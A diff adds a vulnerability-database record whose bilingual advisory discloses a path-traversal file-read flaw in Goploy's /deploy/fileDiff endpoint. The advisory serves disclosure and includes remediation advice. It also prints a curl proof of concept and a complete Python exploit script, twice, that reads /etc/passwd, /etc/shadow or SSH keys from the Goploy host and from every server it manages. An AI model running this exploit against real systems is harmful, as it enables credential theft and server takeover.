@@ -1,0 +1,555 @@
+[id]
+ave_id = "AVE-2026-0413"
+aliases = ["CVE-2026-53553","GHSA-4g5x-hcwm-82jw"]
+
+[basic]
+title = "Goploy: Arbitrary File Read via Path Traversal in /deploy/fileDiff allows Remote Server Compromise"
+description = "> [ Click here to jump to the Simplified Chinese version (点击跳转到简体中文版本)](#goploy-系统任意文件读取)
+# Goploy System Arbitrary File Read Vulnerability
+
+## Basic Information
+- **Vulnerability Name**: Goploy Endpoints Arbitrary File Read via Path Traversal
+- **Vulnerability Type**: Path Traversal (CWE-22) / Arbitrary File Read
+- **Affected Product**: Goploy
+- **Severity Level**: High (CVSS V3 7.7)
+- **Known Affected Versions**: <=1.17.5 
+
+## Vulnerability Description
+Goploy is an open-source automation deployment system. A severe path traversal vulnerability exists in its backend API endpoints, specifically `/deploy/fileDiff` (File Compare), when handling file paths provided by the client.
+
+The original logic of this endpoint is to read a local project file and compare it with a file on a remote target server. However, due to insufficient validation and sanitization of the `filePath` parameter, and the lack of security constraints on the final absolute file path, malicious paths containing `../` are directly executed within the system.
+
+This leads to a **dual arbitrary file read** issue:
+1. **Local Host File Read**: `os.ReadFile` is tricked by the directory traversal payload to read any file via its absolute path on the Goploy local host (returned in the `srcText` field of the response body).
+2. **Remote Controlled Server File Read**: Subsequently, the same payload is utilized via the SFTP protocol on the target server pointed to by the `serverID`. Influenced similarly by the directory traversal, it reads any file on the configured remote server (returned in the `distText` field of the response body).
+
+**The threshold for exploiting this vulnerability is extremely low, and the conditions are very easily met.** The system comes with a built-in `member` role upon default installation, which is **granted the \"File Compare\" permission by default**. This means that as long as a normal low-privileged user is added to the system, they inherently possess the basic privileges required to call the vulnerable endpoint. The only prerequisite for the attack is that at least one project and one associated server are configured in the system.
+
+An attacker only needs to specify the correct namespace header (e.g., `G-N-ID: 1`) via a packet capture tool to bypass simple restrictions. By enumerating available `serverId` parameters, the attacker can successfully execute path traversal via this endpoint, reading arbitrary files on both the local Goploy host and **all remote target servers managed by Goploy**.
+
+## Steps to Reproduce (Proof of Concept)
+
+### Theoretical Steps (See concrete steps below)
+1. **Obtain Normal User Privileges**
+   Log in to the system using any registered low-privileged account to obtain valid authentication credentials (Cookie/Token) and its corresponding authorized Namespace ID.
+
+2. **Construct Malicious Request**
+   Send a POST request containing the directory traversal characters `../` to the target endpoint `/deploy/fileDiff`, while including the `G-N-ID` header.
+
+   **PoC Example (Reading `/etc/passwd` and enumerating `serverId`):**
+   ```bash
+   curl -s -X POST -b \"goploy_token=<valid_cookie>\" \
+        -H \"Content-Type: application/json\" \
+        -H \"G-N-ID: 1\" \
+        -d '{\"projectId\":1,\"serverId\":1,\"filePath\":\"../../../../../../../../../../etc/passwd\"}' \
+        \"http://<target-host>/deploy/fileDiff\"
+   ```
+3. **Reproduction Result**
+   The server will return the complete contents of the `/etc/passwd` file from both the host and the remote server.
+
+### Concrete Steps
+1. **Environment Setup**
+    Published an arbitrary project using the super admin account:
+    
+    
+    <img width=\"1919\" height=\"428\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8618a038-9088-45b4-804a-5541e243c6a8\" />
+
+
+    Configured two managed remote servers:
+    
+    <img width=\"1896\" height=\"399\" alt=\"image-1(1)\" src=\"https://github.com/user-attachments/assets/89cfa086-d20b-448e-9cf7-1af5798e3cfe\" />
+
+    Created a normal user and assigned the `member` role (which includes File Compare permission):
+    
+    <img width=\"1910\" height=\"343\" alt=\"image-2\" src=\"https://github.com/user-attachments/assets/b8dda364-c23d-4496-a555-ff477c511d31\" />
+
+    
+    <img width=\"951\" height=\"364\" alt=\"image-3\" src=\"https://github.com/user-attachments/assets/0e20cbed-7341-484c-b0a7-0fcd6ca2fea6\" />
+
+
+2. **Obtain Normal User Privileges**
+    Log in to the system using the registered `test` account to obtain valid authentication credentials (Cookie/Token).
+    
+    
+    <img width=\"1916\" height=\"712\" alt=\"image-4(1)\" src=\"https://github.com/user-attachments/assets/a269b79f-a666-4f3a-95c4-40621e1fbbc2\" />
+
+
+3. **Execute poc.py (See below)**
+    * **Parameter Explanation:**
+    `-u` : Target URL
+    `-t` : Target Cookie/Token to use
+    `-f` : File to read
+    `-s` : ID of the managed server to read from
+
+    * **Reading from the first managed server (Server ID: 1):**
+    ```bash
+    python poc.py -u http://192.168.x.x:8080 -t eyJhbGxxxxxxxxxx... -f /etc/passwd -s 1
+    ```
+    
+    <img width=\"1173\" height=\"608\" alt=\"image-6(1)\" src=\"https://github.com/user-attachments/assets/e442c247-3ebf-449f-94df-2b2b533b9449\" />
+
+    <img width=\"870\" height=\"190\" alt=\"image-5\" src=\"https://github.com/user-attachments/assets/9e53b13a-915c-4f5e-b1bc-f0b3c0b64656\" />
+
+
+    * **Reading from the second managed server (Server ID: 2):**
+    ```bash
+    python poc.py -u http://192.168.x.x:8080 -t eyJhbGxxxxxxxxxx... -f /etc/passwd -s 2
+    ```
+    
+    <img width=\"1173\" height=\"231\" alt=\"image-8(1)\" src=\"https://github.com/user-attachments/assets/54e77e8a-259d-4f74-bf31-1a9625bcbe52\" />
+
+
+4. **Reproduction Result**
+   The server successfully returns the full contents of the `/etc/passwd` file from both the Goploy host and the designated remote servers.
+
+## Impact
+Through this vulnerability, an attacker can bypass authorization to read any sensitive files on the host machine as well as all managed target servers. For example:
+- Read `/etc/passwd` or `/etc/shadow` on the local or remote target servers to obtain host system user information.
+- Read users' SSH private keys (e.g., `~/.ssh/id_rsa`) across different systems, enabling passwordless SSH access to the host or cross-network connections to other servers to steal administrative control, achieving the equivalent of Remote Code Execution (RCE).
+- By enumerating the `serverID`, an attacker can use Goploy as a jump server (bastion host) to conduct large-scale information theft against all bound deployment target systems.
+- Obtain various critical configuration files, database credentials, etc., of the affected systems.
+
+## Remediation Suggestions
+1. **Input Parameter Filtering**: Strictly filter special characters such as `../`, `..\`, and `%00` that can cause directory traversal and truncation when receiving and processing file paths provided by clients.
+2. **Path Whitelist Constraints**: Use built-in functions like `filepath.Clean` to format the path. Before executing system file read/write operations, strictly verify whether the parsed absolute path prefix is within the legitimate restricted directory scope allowed by the application (such as a preset sandbox directory or project workspace).
+3. **Principle of Least Privilege**: The environment or Docker container running the Goploy service should be executed with low-privileged user identities whenever possible, to mitigate the risk of sensitive system files being read.
+4. **Comprehensive API Audit**: Apart from the APIs mentioned above, there are multiple other APIs that suffer from similar path traversal vulnerabilities. If users obtain the corresponding permissions, it can lead to arbitrary file reads **or even writes**.
+
+## poc.py
+```python
+#!/usr/bin/env python3
+import requests
+import argparse
+import sys
+import urllib3
+import json
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def banner():
+    print(r\"\"\"
+  ____             _               ____       ____ 
+ / ___| ___  _ __ | | ___  _   _  |  _ \ ___ / ___|
+| |  _ / _ \| '_ \| |/ _ \| | | | | |_) / _ \ |    
+| |_| | (_) | |_) | | (_) | |_| | |  __/ (_) | |___ 
+ \____|\___/| .__/|_|\___/ \__, | |_|   \___/ \____|
+            |_|            |___/                    
+
+    Goploy Authenticated Arbitrary File Read PoC
+    \"\"\")
+
+def exploit(target_url, token, file_read, args):
+    if not target_url.startswith(\"http\"):
+        target_url = \"http://\" + target_url
+    
+    target_url = target_url.rstrip('/')
+    
+    headers = {
+        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"
+    }
+    
+    cookies = {
+        \"goploy_token\": token
+    }
+    
+    print(\"[*] 正在尝试自动从服务器响应中提取利用所需的所有参数ID...\")
+    
+    # 1. 动态获取可用的 Namespace ID
+    namespace_id = 1
+    print(f\"[*] 1. 尝试获取可用的 Namespace ID (/namespace/getOption)\")
+    try:
+        r_ns = requests.get(f\"{target_url}/namespace/getOption\", headers=headers, cookies=cookies, verify=False, timeout=10)
+        ns_data = r_ns.json()
+        if ns_data.get(\"code\") == 0 and len(ns_data.get(\"data\", {}).get(\"list\", [])) > 0:
+            namespace_id = ns_data[\"data\"][\"list\"][0][\"namespaceId\"]
+            print(f\"[+] 成功提取到 Namespace ID: {namespace_id}\")
+        else:
+            print(f\"[-] 提取 Namespace ID 失败或列表为空，将降级使用默认值 1\")
+    except Exception as e:
+        print(f\"[-] 提取 Namespace ID 发生异常: {e}\")
+
+    # 将获取到的 Namespace ID 放入后续请求的 Header 中
+    headers[\"G-N-ID\"] = str(namespace_id)
+
+    # 2. 动态获取可用的 Server ID
+    server_id = 1
+    if args.server_id is not None:
+        server_id = int(args.server_id)
+        print(f\"[*] 2. 用户指定了 Server ID: {server_id} ,跳过自动探测。可用于水平提权目标网络！\")
+    else:
+        print(f\"[*] 2. 尝试获取可用的 Server ID (/server/getOption)\")
+        try:
+            r_srv = requests.get(f\"{target_url}/server/getOption\", headers=headers, cookies=cookies, verify=False, timeout=10)
+            srv_data = r_srv.json()
+            if srv_data.get(\"code\") == 0 and len(srv_data.get(\"data\", {}).get(\"list\", [])) > 0:
+                server_id = srv_data[\"data\"][\"list\"][0][\"id\"]
+                print(f\"[+] 成功提取到可用 Server ID: {server_id}\")
+            else:
+                print(f\"[-] 提取 Server ID 失败或列表为空，将降级尝试猜测值 1\")
+        except Exception as e:
+            print(f\"[-] 提取 Server ID 发生异常: {e}\")
+
+    # 3. 动态获取可用的 Project ID
+    project_id = 1
+    print(f\"[*] 3. 尝试获取可用的 Project ID (/deploy/getList)\")
+    try:
+        r_proj = requests.get(f\"{target_url}/deploy/getList\", headers=headers, cookies=cookies, verify=False, timeout=10)
+        proj_data = r_proj.json()
+        if proj_data.get(\"code\") == 0 and len(proj_data.get(\"data\", {}).get(\"list\", [])) > 0:
+            project_id = proj_data[\"data\"][\"list\"][0][\"id\"]
+            print(f\"[+] 成功提取到 Project ID: {project_id}\")
+        else:
+            print(f\"[-] 提取 Project ID 失败或列表为空，将降级尝试猜测值 1\")
+    except Exception as e:
+        print(f\"[-] 提取 Project ID 发生异常: {e}\")
+
+    # ==========================
+    # 4. 执行漏洞利用
+    # ==========================
+    headers[\"Content-Type\"] = \"application/json\"
+    
+    # 构造目录穿越 payload
+    traversal_payload = \"../\" * 15 + file_read.lstrip('/')
+    
+    data = {
+        \"projectId\": project_id,
+        \"serverId\": server_id,
+        \"filePath\": traversal_payload
+    }
+
+    url_exploit = f\"{target_url}/deploy/fileDiff\"
+    print(f\"\n[*] 目标地址: {url_exploit}\")
+    print(f\"[*] Payload中包含的系统参数: NamespaceID={namespace_id}, ProjectID={project_id}, ServerID={server_id}\")
+    print(f\"[*] 尝试读取文件: {file_read}\")
+    print(f\"[*] 发送最终利用请求中...\n\")
+
+    try:
+        response = requests.post(url_exploit, headers=headers, cookies=cookies, json=data, verify=False, timeout=10)
+        
+        if response.status_code == 200:
+            try:
+                # 尝试解析 Goploy 的 JSON 回显格式
+                json_data = response.json()
+                if json_data.get('code') in [0, 1, 2]: # 有时候读取回显为完整的 json 
+                    data_obj = json_data.get('data') if isinstance(json_data.get('data'), dict) else {}
+                    
+                    src_text = data_obj.get('srcText', '')
+                    dist_text = data_obj.get('distText', '')
+                    
+                    if src_text or dist_text:
+                        print(\"[+] 漏洞利用成功！产生双重文件读取响应：\n\")
+                        print(\"=\" * 50)
+                        print(f\"【Goploy宿主机 ({url_exploit} 本地) 的文件内容记录在 srcText】:\")
+                        print(\"-\" * 50)
+                        print(src_text if src_text else \"(空)\")
+                        print(\"=\" * 50)
+                        print(f\"【被控目标端服务器 (ServerID: {server_id}) 的文件内容记录在 distText】:\")
+                        print(\"-\" * 50)
+                        print(dist_text if dist_text else \"(空)\")
+                        print(\"=\" * 50)
+                    else:
+                        print(\"[-] 读取操作执行但未返回具体的 srcText 或 distText 数据。正在显示原始 API 返回：\")
+                        print(json.dumps(json_data, indent=2))
+                else:
+                    print(f\"[-] 服务器返回业务错误 (Code={json_data.get('code')}): {json_data.get('message')}\")
+            except ValueError:
+                # 如果不是 JSON 格式，直接输出响应源码
+                print(\"[+] 收到未知格式响应，以下为原始正文内容：\")
+                print(response.text)
+        else:
+            print(f\"[-] HTTP 请求失败，HTTP 状态码: {response.status_code}\")
+            print(response.text)
+            
+    except requests.exceptions.RequestException as e:
+        print(f\"[-] 连接出错: {e}\")
+
+if __name__ == \"__main__\":
+    banner()
+    parser = argparse.ArgumentParser(description=\"Goploy 任意文件读取概念验证脚本 (PoC)\")
+    parser.add_argument(\"-u\", \"--url\", required=True, help=\"目标系统基础 URL，例如：http://192.168.240.130\")
+    parser.add_argument(\"-t\", \"--token\", required=True, help=\"具有低权限成员账户的 goploy_token (Cookie)\")
+    parser.add_argument(\"-f\", \"--file\", default=\"/etc/passwd\", help=\"想要读取的目标绝对路径文件 (默认: /etc/passwd)\")
+    parser.add_argument(\"-s\", \"--server_id\", default=None, help=\"强制指定想要读取的远程绑定服务器ServerID(如忽略则尝试自动获取首个)\")
+    
+    args = parser.parse_args()
+    
+    exploit(args.url, args.token, args.file, args)
+
+```
+
+
+---
+
+
+
+# Goploy 系统任意文件读取
+
+## 漏洞基本信息
+- **漏洞名称**：Goploy 系统端点任意文件读取漏洞
+- **漏洞类型**：路径遍历（Path Traversal, CWE-22） / 任意文件读取
+- **影响产品**：Goploy
+- **漏洞危害级别**：高危（CVSS V3 7.7）
+- **已知影响版本**：<=1.17.5
+
+## 漏洞描述
+Goploy 是一个开源的自动化部署系统。在其后端服务的 `/deploy/fileDiff`（文件对比）等 API 接口处处理客户端传来的文件路径时，存在严重的路径遍历漏洞。
+
+该接口的原始逻辑是读取本地项目文件与远程目标服务器文件进行比对。但由于未能充分校验及过滤用户传入的 `filePath` 参数，也没有对最终的文件绝对路径进行安全约束，将含有 `../` 的恶意路径直接带入系统中执行。
+这导致了一个**双重任意文件读取**的问题：
+1. 本地宿主机文件读取：`os.ReadFile` 会被目录穿越 payload 欺骗，读取出 Goploy 宿主机的本地绝对路径任意文件（返回在响应体的 `srcText` 字段）。
+2. 远程任意受控服务器文件读取：紧接着该 payload 经由 SFTP 协议作用于 `serverID` 所指向的目标服务器，同样由于受到目录穿越影响，最终读取所配置远程服务器上的任意文件（返回在响应体的 `distText` 字段）。
+
+**该漏洞利用门槛极低且条件极易满足。** 系统在默认安装时预设了 `member`（普通成员）角色，且**默认赋予了该角色“文件比对 (FileCompare)”权限**。这意味着系统只要添加了一个普通的低权限使用者，其天然就具备调用目标漏洞端点的基础权限。攻击前提仅仅是系统中配置了至少一个项目和一个服务器。
+
+攻击者仅需通过抓包指定正确的命名空间 Header（例如 `G-N-ID: 1`）绕过其简单的限制拦截，且遍历可用的 `serverId` 参数，即可直接利用该端点成功执行路径遍历，读取 Goploy 本地宿主机以及**各个远端被 Goploy 管理的目标服务器上的任意文件**。
+
+## 漏洞复现步骤 (Proof of Concept)
+
+### 理论步骤（具体步骤见下）
+1. **获取普通用户权限**
+   使用任意已注册的低权限账户登录系统，获取有效的身份认证凭证（Cookie/Token）。获取其对应有权限的 Namespace ID。
+
+2. **构造恶意请求**
+   向目标接口 `/deploy/fileDiff` 发送包含目录穿越字符 `../` 的 POST 请求，并携带 `G-N-ID`。
+
+   **PoC 示例（读取 `/etc/passwd`,可以遍历`serverId`）：**
+   ```bash
+   curl -s -X POST -b \"goploy_token=<用户的有效cookie>\" \
+        -H \"Content-Type: application/json\" \
+        -H \"G-N-ID: 1\" \
+        -d '{\"projectId\":1,\"serverId\":1,\"filePath\":\"../../../../../../../../../../etc/passwd\"}' \
+        \"http://<target-host>/deploy/fileDiff\"
+   ```
+2. **复现结果**
+   服务器将返回宿主机和远端服务器 `/etc/passwd` 文件的完整内容。
+### 具体步骤
+1. **环境**
+    使用超管账号任意发布了一个项目：
+    <img width=\"1919\" height=\"428\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8618a038-9088-45b4-804a-5541e243c6a8\" />
+
+    设置了两个纳管服务器：
+    <img width=\"1896\" height=\"399\" alt=\"image-1(1)\" src=\"https://github.com/user-attachments/assets/89cfa086-d20b-448e-9cf7-1af5798e3cfe\" />
+
+    创建了一个普通用户，并赋予menmber角色（文件对比权限）：
+    <img width=\"1910\" height=\"343\" alt=\"image-2\" src=\"https://github.com/user-attachments/assets/b8dda364-c23d-4496-a555-ff477c511d31\" />
+
+    <img width=\"951\" height=\"364\" alt=\"image-3\" src=\"https://github.com/user-attachments/assets/0e20cbed-7341-484c-b0a7-0fcd6ca2fea6\" />
+
+2. **获取普通用户权限**
+    使用已注册的`test`账户登录系统，获取有效的身份认证凭证（Cookie/Token）。
+    <img width=\"1916\" height=\"712\" alt=\"image-4(1)\" src=\"https://github.com/user-attachments/assets/a269b79f-a666-4f3a-95c4-40621e1fbbc2\" />
+
+3. **运行poc.py（见文末）**
+    * 参数解释：
+    -u : 目标URL
+    -t : 欲使用的Cookie/Token
+    -f : 欲读取的文件
+    -s : 欲读取的纳管服务器的ID
+    * 读取第一个纳管服务器：
+    ```bash
+    python poc.py -u http://192.168.x.x:8080 -t eyJhbGxxxxxxxxxx... -f /etc/passwd -s 1
+    ```
+    <img width=\"1173\" height=\"608\" alt=\"image-6(1)\" src=\"https://github.com/user-attachments/assets/e442c247-3ebf-449f-94df-2b2b533b9449\" />
+    
+    <img width=\"870\" height=\"190\" alt=\"image-5\" src=\"https://github.com/user-attachments/assets/9e53b13a-915c-4f5e-b1bc-f0b3c0b64656\" />
+
+    * 读取第二个纳管服务器：
+    ```bash
+    python poc.py -u http://192.168.x.x:8080 -t eyJhbGxxxxxxxxxx... -f /etc/passwd -s 2
+    ```
+    <img width=\"1173\" height=\"231\" alt=\"image-8(1)\" src=\"https://github.com/user-attachments/assets/54e77e8a-259d-4f74-bf31-1a9625bcbe52\" />
+
+4. **复现结果**
+   服务器返回宿主机和任意远端服务器 `/etc/passwd` 文件的完整内容。
+
+## 漏洞危害
+通过该漏洞，攻击者可越权读取宿主机以及所有纳管服务器目标中的任何敏感文件。例如：
+- 读取本地或目标远端服务器的 `/etc/passwd` 或 `/etc/shadow` 获取主机系统用户信息。
+- 读取各个系统中用户的 SSH 私钥（如 `~/.ssh/id_rsa`），从而利用私钥无需密码直接通过 SSH 远程连接宿主机或跨网段连接其他服务器，窃取服务器控制权，达到远程命令执行（RCE）的同等危害。
+- 结合对 `serverID` 的枚举，攻击者可以将 Goploy 作为跳板机，针对所有绑定的下发目标系统进行大范围的信息窃取。
+- 获取系统的各类关键配置文件、数据库凭证等。
+
+## 修复建议
+1. **输入参数过滤**：在接收并处理客户端传递的文件路径时，严格过滤 `../` 、`..\\` 以及 `%00` 等可能引起目录跨越与截断的特殊字符。
+2. **路径白名单约束**：利用 `filepath.Clean` 等内置函数格式化路径，并且在执行系统文件读写操作前，强制校验解析后的绝对路径前缀是否处于应用所允许的合法受限目录范围（如预设的沙盒目录或项目工作区内）内。
+3. **权限最小化**：运行 Goploy 服务的环境或镜像应尽可能以低权限用户身份运行，以此减弱被读取敏感文件的风险。
+4. **检查其他API**：除以上API，还有多处API存在路径遍历漏洞，如果用户获得相应的权限，同样会导致任意文件读**甚至写**。
+
+## poc.py
+```python
+#!/usr/bin/env python3
+import requests
+import argparse
+import sys
+import urllib3
+import json
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def banner():
+    print(r\"\"\"
+  ____             _               ____       ____ 
+ / ___| ___  _ __ | | ___  _   _  |  _ \ ___ / ___|
+| |  _ / _ \| '_ \| |/ _ \| | | | | |_) / _ \ |    
+| |_| | (_) | |_) | | (_) | |_| | |  __/ (_) | |___ 
+ \____|\___/| .__/|_|\___/ \__, | |_|   \___/ \____|
+            |_|            |___/                    
+
+    Goploy Authenticated Arbitrary File Read PoC
+    \"\"\")
+
+def exploit(target_url, token, file_read, args):
+    if not target_url.startswith(\"http\"):
+        target_url = \"http://\" + target_url
+    
+    target_url = target_url.rstrip('/')
+    
+    headers = {
+        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"
+    }
+    
+    cookies = {
+        \"goploy_token\": token
+    }
+    
+    print(\"[*] 正在尝试自动从服务器响应中提取利用所需的所有参数ID...\")
+    
+    # 1. 动态获取可用的 Namespace ID
+    namespace_id = 1
+    print(f\"[*] 1. 尝试获取可用的 Namespace ID (/namespace/getOption)\")
+    try:
+        r_ns = requests.get(f\"{target_url}/namespace/getOption\", headers=headers, cookies=cookies, verify=False, timeout=10)
+        ns_data = r_ns.json()
+        if ns_data.get(\"code\") == 0 and len(ns_data.get(\"data\", {}).get(\"list\", [])) > 0:
+            namespace_id = ns_data[\"data\"][\"list\"][0][\"namespaceId\"]
+            print(f\"[+] 成功提取到 Namespace ID: {namespace_id}\")
+        else:
+            print(f\"[-] 提取 Namespace ID 失败或列表为空，将降级使用默认值 1\")
+    except Exception as e:
+        print(f\"[-] 提取 Namespace ID 发生异常: {e}\")
+
+    # 将获取到的 Namespace ID 放入后续请求的 Header 中
+    headers[\"G-N-ID\"] = str(namespace_id)
+
+    # 2. 动态获取可用的 Server ID
+    server_id = 1
+    if args.server_id is not None:
+        server_id = int(args.server_id)
+        print(f\"[*] 2. 用户指定了 Server ID: {server_id} ,跳过自动探测。可用于水平提权目标网络！\")
+    else:
+        print(f\"[*] 2. 尝试获取可用的 Server ID (/server/getOption)\")
+        try:
+            r_srv = requests.get(f\"{target_url}/server/getOption\", headers=headers, cookies=cookies, verify=False, timeout=10)
+            srv_data = r_srv.json()
+            if srv_data.get(\"code\") == 0 and len(srv_data.get(\"data\", {}).get(\"list\", [])) > 0:
+                server_id = srv_data[\"data\"][\"list\"][0][\"id\"]
+                print(f\"[+] 成功提取到可用 Server ID: {server_id}\")
+            else:
+                print(f\"[-] 提取 Server ID 失败或列表为空，将降级尝试猜测值 1\")
+        except Exception as e:
+            print(f\"[-] 提取 Server ID 发生异常: {e}\")
+
+    # 3. 动态获取可用的 Project ID
+    project_id = 1
+    print(f\"[*] 3. 尝试获取可用的 Project ID (/deploy/getList)\")
+    try:
+        r_proj = requests.get(f\"{target_url}/deploy/getList\", headers=headers, cookies=cookies, verify=False, timeout=10)
+        proj_data = r_proj.json()
+        if proj_data.get(\"code\") == 0 and len(proj_data.get(\"data\", {}).get(\"list\", [])) > 0:
+            project_id = proj_data[\"data\"][\"list\"][0][\"id\"]
+            print(f\"[+] 成功提取到 Project ID: {project_id}\")
+        else:
+            print(f\"[-] 提取 Project ID 失败或列表为空，将降级尝试猜测值 1\")
+    except Exception as e:
+        print(f\"[-] 提取 Project ID 发生异常: {e}\")
+
+    # ==========================
+    # 4. 执行漏洞利用
+    # ==========================
+    headers[\"Content-Type\"] = \"application/json\"
+    
+    # 构造目录穿越 payload
+    traversal_payload = \"../\" * 15 + file_read.lstrip('/')
+    
+    data = {
+        \"projectId\": project_id,
+        \"serverId\": server_id,
+        \"filePath\": traversal_payload
+    }
+
+    url_exploit = f\"{target_url}/deploy/fileDiff\"
+    print(f\"\n[*] 目标地址: {url_exploit}\")
+    print(f\"[*] Payload中包含的系统参数: NamespaceID={namespace_id}, ProjectID={project_id}, ServerID={server_id}\")
+    print(f\"[*] 尝试读取文件: {file_read}\")
+    print(f\"[*] 发送最终利用请求中...\n\")
+
+    try:
+        response = requests.post(url_exploit, headers=headers, cookies=cookies, json=data, verify=False, timeout=10)
+        
+        if response.status_code == 200:
+            try:
+                # 尝试解析 Goploy 的 JSON 回显格式
+                json_data = response.json()
+                if json_data.get('code') in [0, 1, 2]: # 有时候读取回显为完整的 json 
+                    data_obj = json_data.get('data') if isinstance(json_data.get('data'), dict) else {}
+                    
+                    src_text = data_obj.get('srcText', '')
+                    dist_text = data_obj.get('distText', '')
+                    
+                    if src_text or dist_text:
+                        print(\"[+] 漏洞利用成功！产生双重文件读取响应：\n\")
+                        print(\"=\" * 50)
+                        print(f\"【Goploy宿主机 ({url_exploit} 本地) 的文件内容记录在 srcText】:\")
+                        print(\"-\" * 50)
+                        print(src_text if src_text else \"(空)\")
+                        print(\"=\" * 50)
+                        print(f\"【被控目标端服务器 (ServerID: {server_id}) 的文件内容记录在 distText】:\")
+                        print(\"-\" * 50)
+                        print(dist_text if dist_text else \"(空)\")
+                        print(\"=\" * 50)
+                    else:
+                        print(\"[-] 读取操作执行但未返回具体的 srcText 或 distText 数据。正在显示原始 API 返回：\")
+                        print(json.dumps(json_data, indent=2))
+                else:
+                    print(f\"[-] 服务器返回业务错误 (Code={json_data.get('code')}): {json_data.get('message')}\")
+            except ValueError:
+                # 如果不是 JSON 格式，直接输出响应源码
+                print(\"[+] 收到未知格式响应，以下为原始正文内容：\")
+                print(response.text)
+        else:
+            print(f\"[-] HTTP 请求失败，HTTP 状态码: {response.status_code}\")
+            print(response.text)
+            
+    except requests.exceptions.RequestException as e:
+        print(f\"[-] 连接出错: {e}\")
+
+if __name__ == \"__main__\":
+    banner()
+    parser = argparse.ArgumentParser(description=\"Goploy 任意文件读取概念验证脚本 (PoC)\")
+    parser.add_argument(\"-u\", \"--url\", required=True, help=\"目标系统基础 URL，例如：http://192.168.240.130\")
+    parser.add_argument(\"-t\", \"--token\", required=True, help=\"具有低权限成员账户的 goploy_token (Cookie)\")
+    parser.add_argument(\"-f\", \"--file\", default=\"/etc/passwd\", help=\"想要读取的目标绝对路径文件 (默认: /etc/passwd)\")
+    parser.add_argument(\"-s\", \"--server_id\", default=None, help=\"强制指定想要读取的远程绑定服务器ServerID(如忽略则尝试自动获取首个)\")
+    
+    args = parser.parse_args()
+    
+    exploit(args.url, args.token, args.file, args)
+
+```"
+severity = "HIGH"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-25T01:07:01.453447071+00:00"
